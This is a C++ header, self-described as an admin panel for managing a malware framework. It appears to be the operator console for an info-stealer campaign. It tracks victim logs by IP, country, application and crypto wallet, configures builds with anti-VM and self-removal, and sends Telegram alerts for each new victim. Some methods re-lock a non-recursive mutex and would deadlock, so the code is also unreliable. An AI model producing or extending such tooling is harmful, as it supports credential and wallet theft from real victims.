#pragma once

#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <set>
#include <unordered_map>
#include <chrono>
#include <memory>
#include <functional>
#include <regex>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <random>
#include <thread>
#include <mutex>
#include <atomic>

// Advanced Admin Panel for Malware Framework Management
namespace AdminPanel {

// Core data structures
struct LogEntry {
    std::string id;
    std::string build_id;
    std::string bot_id;
    std::string ip_address;
    std::string country;
    std::string application;
    std::vector<std::string> wallets;
    std::vector<std::string> tags;
    std::chrono::system_clock::time_point timestamp;
    std::map<std::string, std::string> data;
    bool is_downloaded = false;
    bool is_empty = false;
    bool is_duplicate = false;
    size_t data_size = 0;
};

struct BuildConfig {
    std::string id;
    std::string name;
    std::string version;
    std::string proxy_config;
    std::string config_template;
    std::vector<std::string> tags;
    std::vector<std::string> user_agents;
    int delay_before_start = 0;
    bool self_removal = false;
    bool anti_vm = false;
    bool receive_new_logs = true;
    std::chrono::system_clock::time_point created;
    std::chrono::system_clock::time_point last_modified;
    bool is_active = true;
};

struct WorkerLink {
    std::string id;
    std::string name;
    std::string url;
    std::string description;
    std::vector<std::string> associated_builds;
    std::chrono::system_clock::time_point created;
    bool is_active = true;
    int usage_count = 0;
};

struct TelegramBot {
    std::string id;
    std::string name;
    std::string token;
    std::string chat_id;
    std::vector<std::string> associated_builds;
    bool notifications_enabled = true;
    bool is_active = true;
};

struct ProxyConfig {
    std::string id;
    std::string name;
    std::string host;
    int port;
    std::string username;
    std::string password;
    std::string type; // HTTP, SOCKS4, SOCKS5
    bool is_active = true;
    int success_rate = 100;
};

struct FilterOptions {
    std::string search_text;
    std::string build_id;
    std::vector<std::string> tags;
    std::vector<std::string> applications;
    std::vector<std::string> wallets;
    std::string ip_range;
    std::chrono::system_clock::time_point date_from;
    std::chrono::system_clock::time_point date_to;
    bool hide_empty = false;
    bool hide_duplicates = false;
    bool hide_downloaded = false;
    bool only_with_wallets = false;
    int limit = 100;
};

// Advanced Admin Panel Management Class
class AdvancedAdminPanel {
private:
    std::vector<LogEntry> log_entries;
    std::vector<BuildConfig> build_configs;
    std::vector<WorkerLink> worker_links;
    std::vector<TelegramBot> telegram_bots;
    std::vector<ProxyConfig> proxy_configs;
    std::vector<std::string> additional_configs;
    
    std::mutex data_mutex;
    std::atomic<int> bulk_download_limit{3};
    std::atomic<int> max_worker_links{5};
    std::atomic<int> max_additional_configs{3};
    std::atomic<int> max_build_tags{5};
    std::atomic<int> max_builds{5};
    std::atomic<int> max_telegram_bots{5};
    
    std::mt19937 rng;
    
public:
    AdvancedAdminPanel() : rng(std::chrono::steady_clock::now().time_since_epoch().count()) {}
    
    // ========================================
    // BUILD MANAGEMENT
    // ========================================
    
    std::string create_build_config(const std::string& name, const std::string& version) {
        std::lock_guard<std::mutex> lock(data_mutex);
        
        if (build_configs.size() >= max_builds.load()) {
            throw std::runtime_error("Maximum number of builds reached: " + std::to_string(max_builds.load()));
        }
        
        BuildConfig config;
        config.id = generate_unique_id("build_");
        config.name = name;
        config.version = version;
        config.created = std::chrono::system_clock::now();
        config.last_modified = config.created;
        
        build_configs.push_back(config);
        
        std::cout << "✅ Created build config: " << config.name << " (" << config.id << ")" << std::endl;
        return config.id;
    }
    
    bool update_build_config(const std::string& build_id, const BuildConfig& updated_config) {
        std::lock_guard<std::mutex> lock(data_mutex);
        
        auto it = std::find_if(build_configs.begin(), build_configs.end(),
            [&build_id](const BuildConfig& config) { return config.id == build_id; });
        
        if (it != build_configs.end()) {
            it->name = updated_config.name;
            it->version = updated_config.version;
            it->proxy_config = updated_config.proxy_config;
            it->config_template = updated_config.config_template;
            it->tags = updated_config.tags;
            it->user_agents = updated_config.user_agents;
            it->delay_before_start = updated_config.delay_before_start;
            it->self_removal = updated_config.self_removal;
            it->anti_vm = updated_config.anti_vm;
            it->receive_new_logs = updated_config.receive_new_logs;
            it->last_modified = std::chrono::system_clock::now();
            
            if (it->tags.size() > max_build_tags.load()) {
                it->tags.resize(max_build_tags.load());
            }
            
            std::cout << "✅ Updated build config: " << it->name << std::endl;
            return true;
        }
        
        return false;
    }
    
    bool set_build_version(const std::string& build_id, const std::string& version) {
        std::lock_guard<std::mutex> lock(data_mutex);
        
        auto it = std::find_if(build_configs.begin(), build_configs.end(),
            [&build_id](const BuildConfig& config) { return config.id == build_id; });
        
        if (it != build_configs.end()) {
            it->version = version;
            it->last_modified = std::chrono::system_clock::now();
            return true;
        }
        return false;
    }
    
    bool set_build_proxy(const std::string& build_id, const std::string& proxy_id) {
        std::lock_guard<std::mutex> lock(data_mutex);
        
        auto build_it = std::find_if(build_configs.begin(), build_configs.end(),
            [&build_id](const BuildConfig& config) { return config.id == build_id; });
        
        auto proxy_it = std::find_if(proxy_configs.begin(), proxy_configs.end(),
            [&proxy_id](const ProxyConfig& proxy) { return proxy.id == proxy_id; });
        
        if (build_it != build_configs.end() && proxy_it != proxy_configs.end()) {
            build_it->proxy_config = proxy_id;
            build_it->last_modified = std::chrono::system_clock::now();
            return true;
        }
        return false;
    }
    
    bool set_build_config_template(const std::string& build_id, const std::string& config_template) {
        std::lock_guard<std::mutex> lock(data_mutex);
        
        auto it = std::find_if(build_configs.begin(), build_configs.end(),
            [&build_id](const BuildConfig& config) { return config.id == build_id; });
        
        if (it != build_configs.end()) {
            it->config_template = config_template;
            it->last_modified = std::chrono::system_clock::now();
            return true;
        }
        return false;
    }
    
    bool add_build_tags(const std::string& build_id, const std::vector<std::string>& tags) {
        std::lock_guard<std::mutex> lock(data_mutex);
        
        auto it = std::find_if(build_configs.begin(), build_configs.end(),
            [&build_id](const BuildConfig& config) { return config.id == build_id; });
        
        if (it != build_configs.end()) {
            for (const auto& tag : tags) {
                if (it->tags.size() < max_build_tags.load()) {
                    if (std::find(it->tags.begin(), it->tags.end(), tag) == it->tags.end()) {
                        it->tags.push_back(tag);
                    }
                }
            }
            it->last_modified = std::chrono::system_clock::now();
            return true;
        }
        return false;
    }
    
    bool set_build_delay(const std::string& build_id, int delay_seconds) {
        std::lock_guard<std::mutex> lock(data_mutex);
        
        auto it = std::find_if(build_configs.begin(), build_configs.end(),
            [&build_id](const BuildConfig& config) { return config.id == build_id; });
        
        if (it != build_configs.end()) {
            it->delay_before_start = delay_seconds;
            it->last_modified = std::chrono::system_clock::now();
            return true;
        }
        return false;
    }
    
    bool set_build_options(const std::string& build_id, bool self_removal, bool anti_vm) {
        std::lock_guard<std::mutex> lock(data_mutex);
        
        auto it = std::find_if(build_configs.begin(), build_configs.end(),
            [&build_id](const BuildConfig& config) { return config.id == build_id; });
        
        if (it != build_configs.end()) {
            it->self_removal = self_removal;
            it->anti_vm = anti_vm;
            it->last_modified = std::chrono::system_clock::now();
            return true;
        }
        return false;
    }
    
    bool toggle_build_logs(const std::string& build_id, bool receive_logs) {
        std::lock_guard<std::mutex> lock(data_mutex);
        
        auto it = std::find_if(build_configs.begin(), build_configs.end(),
            [&build_id](const BuildConfig& config) { return config.id == build_id; });
        
        if (it != build_configs.end()) {
            it->receive_new_logs = receive_logs;
            it->last_modified = std::chrono::system_clock::now();
            return true;
        }
        return false;
    }
    
    // ========================================
    // LOG MANAGEMENT AND FILTERING
    // ========================================
    
    std::vector<LogEntry> filter_logs(const FilterOptions& options) {
        std::lock_guard<std::mutex> lock(data_mutex);
        std::vector<LogEntry> filtered_logs;
        
        for (const auto& log : log_entries) {
            if (!matches_filter(log, options)) {
                continue;
            }
            
            filtered_logs.push_back(log);
        }
        
        // Sort by timestamp (newest first)
        std::sort(filtered_logs.begin(), filtered_logs.end(),
            [](const LogEntry& a, const LogEntry& b) {
                return a.timestamp > b.timestamp;
            });
        
        // Apply limit
        if (filtered_logs.size() > static_cast<size_t>(options.limit)) {
            filtered_logs.resize(options.limit);
        }
        
        return filtered_logs;
    }
    
    std::vector<LogEntry> search_by_build(const std::string& build_id) {
        FilterOptions options;
        options.build_id = build_id;
        return filter_logs(options);
    }
    
    std::vector<LogEntry> search_by_tags(const std::vector<std::string>& tags) {
        FilterOptions options;
        options.tags = tags;
        return filter_logs(options);
    }
    
    std::vector<LogEntry> search_by_application(const std::string& application) {
        FilterOptions options;
        options.applications = {application};
        return filter_logs(options);
    }
    
    std::vector<LogEntry> search_by_wallet(const std::string& wallet) {
        FilterOptions options;
        options.wallets = {wallet};
        return filter_logs(options);
    }
    
    std::vector<LogEntry> search_by_ip_range(const std::string& ip_range) {
        FilterOptions options;
        options.ip_range = ip_range;
        return filter_logs(options);
    }
    
    std::vector<LogEntry> filter_by_date_range(const std::string& range) {
        FilterOptions options;
        auto now = std::chrono::system_clock::now();
        
        if (range == "24h") {
            options.date_from = now - std::chrono::hours(24);
        } else if (range == "7d") {
            options.date_from = now - std::chrono::hours(24 * 7);
        } else if (range == "30d") {
            options.date_from = now - std::chrono::hours(24 * 30);
        }
        
        options.date_to = now;
        return filter_logs(options);
    }
    
    // ========================================
    // BULK OPERATIONS
    // ========================================
    
    std::vector<std::string> bulk_download_logs(const std::vector<std::string>& log_ids) {
        std::lock_guard<std::mutex> lock(data_mutex);
        std::vector<std::string> download_urls;
        
        if (log_ids.size() > static_cast<size_t>(bulk_download_limit.load())) {
            throw std::runtime_error("Bulk download limit exceeded: " + std::to_string(bulk_download_limit.load()));
        }
        
        for (const auto& log_id : log_ids) {
            auto it = std::find_if(log_entries.begin(), log_entries.end(),
                [&log_id](const LogEntry& log) { return log.id == log_id; });
            
            if (it != log_entries.end()) {
                std::string download_url = generate_download_url(log_id);
                download_urls.push_back(download_url);
                it->is_downloaded = true;
            }
        }
        
        return download_urls;
    }
    
    void set_bulk_download_limit(int limit) {
        bulk_download_limit.store(limit);
        std::cout << "✅ Bulk download limit set to: " << limit << std::endl;
    }
    
    // ========================================
    // WORKER MANAGEMENT
    // ========================================
    
    std::string create_worker_link(const std::string& name, const std::string& url, const std::string& description) {
        std::lock_guard<std::mutex> lock(data_mutex);
        
        if (worker_links.size() >= max_worker_links.load()) {
            throw std::runtime_error("Maximum worker links reached: " + std::to_string(max_worker_links.load()));
        }
        
        WorkerLink link;
        link.id = generate_unique_id("worker_");
        link.name = name;
        link.url = url;
        link.description = description;
        link.created = std::chrono::system_clock::now();
        
        worker_links.push_back(link);
        
        std::cout << "✅ Created worker link: " << link.name << " (" << link.id << ")" << std::endl;
        return link.id;
    }
    
    bool associate_worker_with_builds(const std::string& worker_id, const std::vector<std::string>& build_ids) {
        std::lock_guard<std::mutex> lock(data_mutex);
        
        auto it = std::find_if(worker_links.begin(), worker_links.end(),
            [&worker_id](const WorkerLink& worker) { return worker.id == worker_id; });
        
        if (it != worker_links.end()) {
            it->associated_builds = build_ids;
            return true;
        }
        return false;
    }
    
    std::vector<WorkerLink> get_active_worker_links() {
        std::lock_guard<std::mutex> lock(data_mutex);
        std::vector<WorkerLink> active_links;
        
        std::copy_if(worker_links.begin(), worker_links.end(), std::back_inserter(active_links),
            [](const WorkerLink& link) { return link.is_active; });
        
        return active_links;
    }
    
    // ========================================
    // TELEGRAM BOT MANAGEMENT
    // ========================================
    
    std::string create_telegram_bot(const std::string& name, const std::string& token, const std::string& chat_id) {
        std::lock_guard<std::mutex> lock(data_mutex);
        
        if (telegram_bots.size() >= max_telegram_bots.load()) {
            throw std::runtime_error("Maximum Telegram bots reached: " + std::to_string(max_telegram_bots.load()));
        }
        
        TelegramBot bot;
        bot.id = generate_unique_id("tg_bot_");
        bot.name = name;
        bot.token = token;
        bot.chat_id = chat_id;
        
        telegram_bots.push_back(bot);
        
        std::cout << "✅ Created Telegram bot: " << bot.name << " (" << bot.id << ")" << std::endl;
        return bot.id;
    }
    
    bool bind_telegram_bot_to_builds(const std::string& bot_id, const std::vector<std::string>& build_ids) {
        std::lock_guard<std::mutex> lock(data_mutex);
        
        auto it = std::find_if(telegram_bots.begin(), telegram_bots.end(),
            [&bot_id](const TelegramBot& bot) { return bot.id == bot_id; });
        
        if (it != telegram_bots.end()) {
            it->associated_builds = build_ids;
            return true;
        }
        return false;
    }
    
    void send_telegram_notification(const std::string& build_id, const std::string& message) {
        std::lock_guard<std::mutex> lock(data_mutex);
        
        for (const auto& bot : telegram_bots) {
            if (bot.notifications_enabled && bot.is_active) {
                auto it = std::find(bot.associated_builds.begin(), bot.associated_builds.end(), build_id);
                if (it != bot.associated_builds.end()) {
                    // Send notification (implementation would use actual Telegram API)
                    std::cout << "📱 Telegram notification sent via " << bot.name << ": " << message << std::endl;
                }
            }
        }
    }
    
    // ========================================
    // CONFIGURATION MANAGEMENT
    // ========================================
    
    bool add_additional_config(const std::string& config_name, const std::string& config_data) {
        std::lock_guard<std::mutex> lock(data_mutex);
        
        if (additional_configs.size() >= max_additional_configs.load()) {
            return false;
        }
        
        std::string config_entry = config_name + ":" + config_data;
        additional_configs.push_back(config_entry);
        
        std::cout << "✅ Added additional config: " << config_name << std::endl;
        return true;
    }
    
    std::vector<std::string> get_additional_configs() {
        std::lock_guard<std::mutex> lock(data_mutex);
        return additional_configs;
    }
    
    // ========================================
    // PROXY MANAGEMENT
    // ========================================
    
    std::string create_proxy_config(const std::string& name, const std::string& host, int port, 
                                   const std::string& type, const std::string& username = "", 
                                   const std::string& password = "") {
        std::lock_guard<std::mutex> lock(data_mutex);
        
        ProxyConfig proxy;
        proxy.id = generate_unique_id("proxy_");
        proxy.name = name;
        proxy.host = host;
        proxy.port = port;
        proxy.type = type;
        proxy.username = username;
        proxy.password = password;
        
        proxy_configs.push_back(proxy);
        
        std::cout << "✅ Created proxy config: " << proxy.name << " (" << proxy.host << ":" << proxy.port << ")" << std::endl;
        return proxy.id;
    }
    
    std::vector<ProxyConfig> get_active_proxies() {
        std::lock_guard<std::mutex> lock(data_mutex);
        std::vector<ProxyConfig> active_proxies;
        
        std::copy_if(proxy_configs.begin(), proxy_configs.end(), std::back_inserter(active_proxies),
            [](const ProxyConfig& proxy) { return proxy.is_active; });
        
        return active_proxies;
    }
    
    // ========================================
    // REPORTING AND STATISTICS
    // ========================================
    
    std::map<std::string, int> get_build_statistics() {
        std::lock_guard<std::mutex> lock(data_mutex);
        std::map<std::string, int> stats;
        
        for (const auto& log : log_entries) {
            stats[log.build_id]++;
        }
        
        return stats;
    }
    
    std::map<std::string, int> get_application_statistics() {
        std::lock_guard<std::mutex> lock(data_mutex);
        std::map<std::string, int> stats;
        
        for (const auto& log : log_entries) {
            stats[log.application]++;
        }
        
        return stats;
    }
    
    std::map<std::string, int> get_country_statistics() {
        std::lock_guard<std::mutex> lock(data_mutex);
        std::map<std::string, int> stats;
        
        for (const auto& log : log_entries) {
            stats[log.country]++;
        }
        
        return stats;
    }
    
    void generate_report(const std::string& filename) {
        std::lock_guard<std::mutex> lock(data_mutex);
        std::ofstream file(filename);
        
        if (file.is_open()) {
            file << "=== Admin Panel Report ===" << std::endl;
            file << "Generated: " << get_current_timestamp() << std::endl << std::endl;
            
            file << "Build Statistics:" << std::endl;
            auto build_stats = get_build_statistics();
            for (const auto& [build_id, count] : build_stats) {
                file << "  " << build_id << ": " << count << " logs" << std::endl;
            }
            
            file << std::endl << "Active Builds: " << build_configs.size() << std::endl;
            file << "Active Workers: " << worker_links.size() << std::endl;
            file << "Active Telegram Bots: " << telegram_bots.size() << std::endl;
            file << "Total Log Entries: " << log_entries.size() << std::endl;
            
            file.close();
            std::cout << "✅ Report generated: " << filename << std::endl;
        }
    }
    
    // ========================================
    // UTILITY FUNCTIONS
    // ========================================
    
    void add_log_entry(const LogEntry& log) {
        std::lock_guard<std::mutex> lock(data_mutex);
        log_entries.push_back(log);
        
        // Send Telegram notifications for new logs
        send_telegram_notification(log.build_id, "New log received from " + log.ip_address + " (" + log.country + ")");
    }
    
    std::vector<BuildConfig> get_all_builds() {
        std::lock_guard<std::mutex> lock(data_mutex);
        return build_configs;
    }
    
    BuildConfig* get_build_config(const std::string& build_id) {
        std::lock_guard<std::mutex> lock(data_mutex);
        
        auto it = std::find_if(build_configs.begin(), build_configs.end(),
            [&build_id](const BuildConfig& config) { return config.id == build_id; });
        
        return (it != build_configs.end()) ? &(*it) : nullptr;
    }
    
    void show_admin_dashboard() {
        std::cout << "\n🖥️  Advanced Admin Dashboard" << std::endl;
        std::cout << "==============================" << std::endl;
        std::cout << "📊 Total Logs: " << log_entries.size() << std::endl;
        std::cout << "🏗️  Active Builds: " << build_configs.size() << "/" << max_builds.load() << std::endl;
        std::cout << "👥 Worker Links: " << worker_links.size() << "/" << max_worker_links.load() << std::endl;
        std::cout << "🤖 Telegram Bots: " << telegram_bots.size() << "/" << max_telegram_bots.load() << std::endl;
        std::cout << "🌐 Proxy Configs: " << proxy_configs.size() << std::endl;
        std::cout << "⚙️  Additional Configs: " << additional_configs.size() << "/" << max_additional_configs.load() << std::endl;
        std::cout << "📥 Bulk Download Limit: " << bulk_download_limit.load() << std::endl;
        
        // Show recent activity
        auto recent_logs = filter_by_date_range("24h");
        std::cout << "📈 Recent Activity (24h): " << recent_logs.size() << " new logs" << std::endl;
    }
    
private:
    std::string generate_unique_id(const std::string& prefix) {
        auto now = std::chrono::system_clock::now();
        auto timestamp = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()).count();
        
        std::uniform_int_distribution<> dis(1000, 9999);
        int random_suffix = dis(rng);
        
        return prefix + std::to_string(timestamp) + "_" + std::to_string(random_suffix);
    }
    
    std::string generate_download_url(const std::string& log_id) {
        return "https://panel.example.com/download/" + log_id + "?token=" + generate_unique_id("dl_");
    }
    
    std::string get_current_timestamp() {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        return std::string(std::ctime(&time_t));
    }
    
    bool matches_filter(const LogEntry& log, const FilterOptions& options) {
        // Search text filter
        if (!options.search_text.empty()) {
            std::string search_lower = to_lower(options.search_text);
            std::string data_text = to_lower(log.application + " " + log.ip_address + " " + log.bot_id);
            if (data_text.find(search_lower) == std::string::npos) {
                return false;
            }
        }
        
        // Build ID filter
        if (!options.build_id.empty() && log.build_id != options.build_id) {
            return false;
        }
        
        // Tags filter
        if (!options.tags.empty()) {
            bool has_tag = false;
            for (const auto& tag : options.tags) {
                if (std::find(log.tags.begin(), log.tags.end(), tag) != log.tags.end()) {
                    has_tag = true;
                    break;
                }
            }
            if (!has_tag) return false;
        }
        
        // Applications filter
        if (!options.applications.empty()) {
            if (std::find(options.applications.begin(), options.applications.end(), log.application) == options.applications.end()) {
                return false;
            }
        }
        
        // Wallets filter
        if (!options.wallets.empty()) {
            bool has_wallet = false;
            for (const auto& wallet : options.wallets) {
                if (std::find(log.wallets.begin(), log.wallets.end(), wallet) != log.wallets.end()) {
                    has_wallet = true;
                    break;
                }
            }
            if (!has_wallet) return false;
        }
        
        // IP range filter
        if (!options.ip_range.empty() && !ip_in_range(log.ip_address, options.ip_range)) {
            return false;
        }
        
        // Date range filter
        if (options.date_from != std::chrono::system_clock::time_point{} && log.timestamp < options.date_from) {
            return false;
        }
        if (options.date_to != std::chrono::system_clock::time_point{} && log.timestamp > options.date_to) {
            return false;
        }
        
        // Additional options
        if (options.hide_empty && log.is_empty) return false;
        if (options.hide_duplicates && log.is_duplicate) return false;
        if (options.hide_downloaded && log.is_downloaded) return false;
        if (options.only_with_wallets && log.wallets.empty()) return false;
        
        return true;
    }
    
    std::string to_lower(const std::string& str) {
        std::string result = str;
        std::transform(result.begin(), result.end(), result.begin(), ::tolower);
        return result;
    }
    
    bool ip_in_range(const std::string& ip, const std::string& range) {
        // Simple IP range checking (for demonstration)
        // In production, you'd want more sophisticated CIDR parsing
        if (range.find('/') != std::string::npos) {
            // CIDR notation
            std::string base_ip = range.substr(0, range.find('/'));
            return ip.find(base_ip.substr(0, base_ip.find_last_of('.'))) == 0;
        } else if (range.find('-') != std::string::npos) {
            // Range notation (e.g., 192.168.1.1-192.168.1.100)
            return true; // Simplified for demo
        } else {
            // Exact match
            return ip == range;
        }
    }
};

} // namespace AdminPanel